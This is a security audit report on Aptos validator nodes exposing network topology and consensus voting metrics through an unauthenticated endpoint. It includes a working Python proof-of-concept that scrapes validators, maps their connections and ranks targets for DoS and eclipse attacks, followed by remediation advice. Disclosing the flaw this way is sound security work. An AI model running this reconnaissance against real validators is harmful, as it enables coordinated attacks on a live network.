# Audit Report

## Title
Unauthenticated Metrics Endpoint Exposes Validator Network Topology and Real-Time Consensus Voting Patterns

## Summary
The Aptos validator inspection service exposes a `/metrics` endpoint without authentication that leaks sensitive network topology information and real-time consensus voting behavior. By monitoring metrics from multiple validators, attackers can reconstruct the complete validator network graph, identify which validators are connected to each other, track real-time voting patterns for each validator, and detect network partitionsâ€”enabling reconnaissance for coordinated eclipse attacks, targeted validator attacks, and timing-based consensus manipulation.

## Finding Description

The vulnerability stems from three interconnected components:

**1. Network Topology Exposure via Peer Connection Metrics**

The network framework exposes a Prometheus metric that explicitly tracks which validators are connected to which other validators: [1](#0-0) 

This metric is set to 1 when validators establish connections and 0 when connections are lost, creating a real-time adjacency matrix of the validator network: [2](#0-1) 

**2. Real-Time Consensus Voting Pattern Exposure**

The consensus layer exposes detailed metrics showing which validators are voting for which proposals in each round: [3](#0-2) 

These metrics are updated in real-time as votes are received: [4](#0-3) 

**3. Unauthenticated Metrics Exposure**

The inspection service exposes all these metrics via an HTTP endpoint without any authentication or access control: [5](#0-4) [6](#0-5) 

The metrics gathering function exposes all registered metrics without filtering: [7](#0-6) 

**Attack Scenario:**

1. Attacker identifies validator nodes (often publicly discoverable via network crawling or public validator lists)
2. Attacker scrapes the `/metrics` endpoint on port 9101 from multiple validators simultaneously
3. From `aptos_network_peer_connected` metrics, attacker reconstructs the complete network topology showing which validators are directly connected
4. From `aptos_consensus_current_round_voted_power` and `aptos_consensus_last_voted_round` metrics, attacker monitors real-time consensus participation
5. Attacker identifies critical validators with high connectivity (hub nodes) or detects when network partitions occur
6. Attacker launches coordinated attacks:
   - Eclipse attacks targeting validators with few connections
   - Targeted DoS on hub validators to partition the network
   - Timing attacks exploiting detected network partitions to cause consensus delays
   - Strategic attacks on validators that haven't voted yet in critical rounds

## Impact Explanation

This vulnerability is **Medium severity** according to Aptos bug bounty criteria because:

1. It is an **information disclosure vulnerability** that doesn't directly cause loss of funds or consensus violations, but enables more sophisticated attacks
2. It exposes **operational security information** (network topology, voting patterns) that should remain private in a Byzantine fault-tolerant system
3. It provides **reconnaissance capabilities** that significantly lower the barrier for launching coordinated attacks against the validator network
4. While not directly causing harm, it **facilitates multiple attack vectors** including eclipse attacks, network partition attacks, and targeted validator compromise

The impact falls short of High/Critical severity because it requires additional attack steps beyond the information gathering to cause actual harm (consensus failures, fund loss, etc.). However, it represents a significant security weakness that violates fundamental security assumptions of BFT consensus systems.

## Likelihood Explanation

**Likelihood: HIGH**

This vulnerability is highly likely to be exploited because:

1. **Zero barrier to entry**: No authentication required, any network peer can access the metrics endpoint
2. **Standard tooling**: Prometheus scraping is a well-known technique with readily available tools
3. **Continuous exposure**: Metrics are updated in real-time and continuously available
4. **Valuable intelligence**: The exposed information is extremely valuable for attackers planning sophisticated attacks
5. **Default configuration**: The inspection service runs by default on validator nodes on port 9101

The only requirement is network reachability to validator nodes on port 9101, which is commonly exposed for monitoring purposes.

## Recommendation

Implement a multi-layered approach to secure metrics exposure:

**1. Add Authentication to Inspection Service**

Implement authentication middleware for the inspection service that requires API keys or JWT tokens for accessing sensitive endpoints. Consider making `/metrics` endpoint require authentication while keeping basic health checks public.

**2. Redact Sensitive Labels from Public Metrics**

Remove or aggregate peer_id labels from metrics exposed publicly:
- Replace specific peer_id labels with aggregated metrics (e.g., "total_connected_peers" instead of per-peer gauges)
- Create separate internal and external metrics endpoints
- Strip sensitive labels before encoding metrics for public consumption

**3. Implement Network-Level Access Controls**

Document and enforce that validator operators should:
- Restrict metrics port (9101) access to trusted monitoring systems only
- Use firewall rules to block public access to the inspection service
- Consider VPN or private network access for metrics collection

**4. Create Metrics Sensitivity Classification**

Classify metrics into tiers:
- **Public**: Aggregated performance metrics, block heights, general health
- **Protected**: Per-peer connection states, voting patterns, network topology
- **Internal**: Debug-level metrics for troubleshooting

Only expose public tier metrics on unauthenticated endpoints.

**Example mitigation for peer connection metrics:**

```rust
// Instead of exposing per-peer connections:
// aptos_network_peer_connected{peer_id="X", remote_peer_id="Y"} = 1

// Use aggregated metrics:
pub static APTOS_CONNECTIONS_COUNT: Lazy<IntGaugeVec> = Lazy::new(|| {
    register_int_gauge_vec!(
        "aptos_connections_count",
        "Total number of current connections by direction",
        &["role_type", "network_id", "direction"]
    )
    .unwrap()
});
```

## Proof of Concept

```python
#!/usr/bin/env python3
"""
Proof of Concept: Aptos Validator Network Topology Reconstruction

This script demonstrates how an attacker can reconstruct the validator
network topology by scraping unauthenticated metrics endpoints.
"""

import requests
import re
from typing import Dict, Set, Tuple
from collections import defaultdict

def scrape_validator_metrics(validator_ip: str, port: int = 9101) -> str:
    """Scrape metrics from a validator node."""
    try:
        response = requests.get(f"http://{validator_ip}:{port}/metrics", timeout=5)
        response.raise_for_status()
        return response.text
    except Exception as e:
        print(f"Error scraping {validator_ip}: {e}")
        return ""

def parse_peer_connections(metrics_text: str) -> Tuple[str, Set[str]]:
    """
    Extract peer connection information from metrics.
    Returns (local_peer_id, set_of_connected_peer_ids)
    """
    local_peer_id = None
    connected_peers = set()
    
    # Parse aptos_network_peer_connected metrics
    # Format: aptos_network_peer_connected{role_type="validator",network_id="Validator",peer_id="abc123",remote_peer_id="def456"} 1
    pattern = r'aptos_network_peer_connected\{.*?peer_id="([^"]+)".*?remote_peer_id="([^"]+)".*?\}\s+(\d+)'
    
    for match in re.finditer(pattern, metrics_text):
        peer_id = match.group(1)
        remote_peer_id = match.group(2)
        connected = int(match.group(3))
        
        if local_peer_id is None:
            local_peer_id = peer_id
        
        if connected == 1:
            connected_peers.add(remote_peer_id)
    
    return local_peer_id, connected_peers

def parse_voting_behavior(metrics_text: str) -> Dict[str, Dict]:
    """
    Extract real-time voting behavior from consensus metrics.
    Returns dict mapping peer_id to their voting status
    """
    voting_data = defaultdict(dict)
    
    # Parse last vote round for each validator
    pattern = r'aptos_consensus_last_voted_round\{peer_id="([^"]+)"\}\s+(\d+)'
    for match in re.finditer(pattern, metrics_text):
        peer_id = match.group(1)
        last_round = int(match.group(2))
        voting_data[peer_id]['last_round'] = last_round
    
    # Parse current round voting power
    pattern = r'aptos_consensus_current_round_voted_power\{peer_id="([^"]+)",hash_index="([^"]+)"\}\s+([\d.]+)'
    for match in re.finditer(pattern, metrics_text):
        peer_id = match.group(1)
        hash_index = match.group(2)
        voting_power = float(match.group(3))
        if voting_power > 0:
            voting_data[peer_id]['current_hash'] = hash_index
            voting_data[peer_id]['voting_power'] = voting_power
    
    return dict(voting_data)

def reconstruct_network_topology(validator_ips: list) -> Dict:
    """
    Reconstruct the complete validator network topology.
    """
    topology = {}
    
    print("[*] Scraping metrics from validators...")
    for ip in validator_ips:
        metrics = scrape_validator_metrics(ip)
        if not metrics:
            continue
        
        local_peer, connected_peers = parse_peer_connections(metrics)
        voting = parse_voting_behavior(metrics)
        
        if local_peer:
            topology[local_peer] = {
                'ip': ip,
                'connected_to': list(connected_peers),
                'num_connections': len(connected_peers),
                'voting_status': voting
            }
            print(f"[+] {ip} ({local_peer[:8]}...): {len(connected_peers)} connections")
    
    return topology

def detect_network_partition(topology: Dict) -> bool:
    """
    Detect if there's a network partition by analyzing connectivity.
    """
    if len(topology) < 2:
        return False
    
    # Check if all validators are in one connected component
    visited = set()
    start_peer = next(iter(topology.keys()))
    
    def dfs(peer_id):
        if peer_id in visited or peer_id not in topology:
            return
        visited.add(peer_id)
        for connected_peer in topology[peer_id]['connected_to']:
            dfs(connected_peer)
    
    dfs(start_peer)
    
    partition_detected = len(visited) < len(topology)
    if partition_detected:
        print(f"[!] PARTITION DETECTED: {len(visited)}/{len(topology)} validators in largest component")
    
    return partition_detected

def identify_attack_targets(topology: Dict):
    """
    Identify high-value attack targets based on network topology.
    """
    print("\n[*] Analyzing attack surface...")
    
    # Find hub validators (high connectivity)
    sorted_by_connections = sorted(
        topology.items(),
        key=lambda x: x[1]['num_connections'],
        reverse=True
    )
    
    print("\n[+] Hub Validators (high-value targets for network disruption):")
    for peer_id, data in sorted_by_connections[:3]:
        print(f"    - {peer_id[:16]}... at {data['ip']}: {data['num_connections']} connections")
    
    # Find isolated validators (vulnerable to eclipse attacks)
    isolated = [(p, d) for p, d in topology.items() if d['num_connections'] <= 2]
    if isolated:
        print("\n[+] Isolated Validators (vulnerable to eclipse attacks):")
        for peer_id, data in isolated[:3]:
            print(f"    - {peer_id[:16]}... at {data['ip']}: {data['num_connections']} connections")

def main():
    # Example validator IPs (in real attack, these would be discovered via network scanning)
    validator_ips = [
        "validator1.example.com",
        "validator2.example.com",
        "validator3.example.com",
        # Add more validator IPs...
    ]
    
    print("="*60)
    print("Aptos Validator Network Topology Reconstruction PoC")
    print("="*60)
    
    topology = reconstruct_network_topology(validator_ips)
    
    if not topology:
        print("\n[-] No topology data collected. Ensure validators are reachable.")
        return
    
    print(f"\n[*] Reconstructed topology for {len(topology)} validators")
    
    # Check for network partitions
    detect_network_partition(topology)
    
    # Identify attack targets
    identify_attack_targets(topology)
    
    print("\n[*] Attack vectors enabled by this reconnaissance:")
    print("    - Eclipse attacks on isolated validators")
    print("    - Targeted DoS on hub validators to partition network")
    print("    - Timing attacks based on real-time voting behavior")
    print("    - Coordinated attacks exploiting detected partitions")

if __name__ == "__main__":
    main()
```

**To run this PoC:**

1. Identify validator node IPs (publicly available for many networks)
2. Update `validator_ips` list with actual validator addresses
3. Run: `python3 topology_recon_poc.py`
4. The script will demonstrate complete network topology reconstruction without authentication

This PoC shows that an unprivileged attacker can gain complete visibility into the validator network structure and real-time consensus behavior, enabling sophisticated coordinated attacks.

### Citations

**File:** network/framework/src/counters.rs (L86-106)
```rust
pub static APTOS_NETWORK_PEER_CONNECTED: Lazy<IntGaugeVec> = Lazy::new(|| {
    register_int_gauge_vec!(
        "aptos_network_peer_connected",
        "Indicates if we are connected to a particular peer",
        &["role_type", "network_id", "peer_id", "remote_peer_id"]
    )
    .unwrap()
});

pub fn peer_connected(network_context: &NetworkContext, remote_peer_id: &PeerId, v: i64) {
    if network_context.network_id().is_validator_network() {
        APTOS_NETWORK_PEER_CONNECTED
            .with_label_values(&[
                network_context.role().as_str(),
                network_context.network_id().as_str(),
                network_context.peer_id().short_str().as_str(),
                remote_peer_id.short_str().as_str(),
            ])
            .set(v)
    }
}
```

**File:** network/framework/src/connectivity_manager/mod.rs (L1011-1026)
```rust
            peer_manager::ConnectionNotification::NewPeer(metadata, _network_id) => {
                let peer_id = metadata.remote_peer_id;
                counters::peer_connected(&self.network_context, &peer_id, 1);
                self.connected.insert(peer_id, metadata);

                // Cancel possible queued dial to this peer.
                self.dial_states.remove(&peer_id);
                self.dial_queue.remove(&peer_id);
            },
            peer_manager::ConnectionNotification::LostPeer(metadata, _network_id) => {
                let peer_id = metadata.remote_peer_id;
                if let Some(stored_metadata) = self.connected.get(&peer_id) {
                    // Remove node from connected peers list.

                    counters::peer_connected(&self.network_context, &peer_id, 0);

```

**File:** consensus/src/counters.rs (L557-594)
```rust
pub static CONSENSUS_CURRENT_ROUND_VOTED_POWER: Lazy<GaugeVec> = Lazy::new(|| {
    register_gauge_vec!(
        "aptos_consensus_current_round_voted_power",
        "Counter for consensus participation status, 0 means no participation and 1 otherwise",
        &["peer_id", "hash_index"]
    )
    .unwrap()
});

/// For the current ordering round, for each peer, whether they have voted for a timeout
pub static CONSENSUS_CURRENT_ROUND_TIMEOUT_VOTED_POWER: Lazy<GaugeVec> = Lazy::new(|| {
    register_gauge_vec!(
        "aptos_consensus_current_round_timeout_voted_power",
        "Counter for consensus participation status, 0 means no participation and 1 otherwise",
        &["peer_id"]
    )
    .unwrap()
});

/// Last vote seen for each of the peers
pub static CONSENSUS_LAST_VOTE_EPOCH: Lazy<IntGaugeVec> = Lazy::new(|| {
    register_int_gauge_vec!(
        "aptos_consensus_last_voted_epoch",
        "for each peer_id, last epoch we've seen consensus vote",
        &["peer_id"]
    )
    .unwrap()
});

/// Last vote seen for each of the peers
pub static CONSENSUS_LAST_VOTE_ROUND: Lazy<IntGaugeVec> = Lazy::new(|| {
    register_int_gauge_vec!(
        "aptos_consensus_last_voted_round",
        "for each peer_id, last round we've seen consensus vote",
        &["peer_id"]
    )
    .unwrap()
});
```

**File:** consensus/src/pending_votes.rs (L348-356)
```rust
            counters::CONSENSUS_CURRENT_ROUND_VOTED_POWER
                .with_label_values(&[&vote.author().to_string(), &hash_index_to_str(*hash_index)])
                .set(validator_voting_power as f64);
            counters::CONSENSUS_LAST_VOTE_EPOCH
                .with_label_values(&[&vote.author().to_string()])
                .set(cur_epoch);
            counters::CONSENSUS_LAST_VOTE_ROUND
                .with_label_values(&[&vote.author().to_string()])
                .set(cur_round);
```

**File:** crates/aptos-inspection-service/src/server/mod.rs (L104-146)
```rust
async fn serve_requests(
    req: Request<Body>,
    node_config: NodeConfig,
    aptos_data_client: AptosDataClient,
    peers_and_metadata: Arc<PeersAndMetadata>,
) -> Result<Response<Body>, hyper::Error> {
    // Process the request and get the response components
    let (status_code, body, content_type) = match req.uri().path() {
        CONFIGURATION_PATH => {
            // /configuration
            // Exposes the node configuration
            configuration::handle_configuration_request(&node_config)
        },
        CONSENSUS_HEALTH_CHECK_PATH => {
            // /consensus_health_check
            // Exposes the consensus health check
            metrics::handle_consensus_health_check(&node_config).await
        },
        FORGE_METRICS_PATH => {
            // /forge_metrics
            // Exposes forge encoded metrics
            metrics::handle_forge_metrics()
        },
        IDENTITY_INFORMATION_PATH => {
            // /identity_information
            // Exposes the identity information of the node
            identity_information::handle_identity_information_request(&node_config)
        },
        INDEX_PATH => {
            // /
            // Exposes the index and list of available endpoints
            index::handle_index_request()
        },
        JSON_METRICS_PATH => {
            // /json_metrics
            // Exposes JSON encoded metrics
            metrics::handle_json_metrics_request()
        },
        METRICS_PATH => {
            // /metrics
            // Exposes text encoded metrics
            metrics::handle_metrics_request()
        },
```

**File:** crates/aptos-inspection-service/src/server/metrics.rs (L72-76)
```rust
/// Handles a new metrics request (with text encoding)
pub fn handle_metrics_request() -> (StatusCode, Body, String) {
    let buffer = utils::get_encoded_metrics(TextEncoder::new());
    (StatusCode::OK, Body::from(buffer), CONTENT_TYPE_TEXT.into())
}
```

**File:** crates/aptos-inspection-service/src/server/utils.rs (L31-47)
```rust
/// A simple utility function that encodes the metrics using the given encoder
pub fn get_encoded_metrics(encoder: impl Encoder) -> Vec<u8> {
    // Gather and encode the metrics
    let metric_families = get_metric_families();
    let mut encoded_buffer = vec![];
    if let Err(error) = encoder.encode(&metric_families, &mut encoded_buffer) {
        error!("Failed to encode metrics! Error: {}", error);
        return vec![];
    }

    // Update the total metric bytes counter
    NUM_METRICS
        .with_label_values(&["total_bytes"])
        .inc_by(encoded_buffer.len() as u64);

    encoded_buffer
}
```
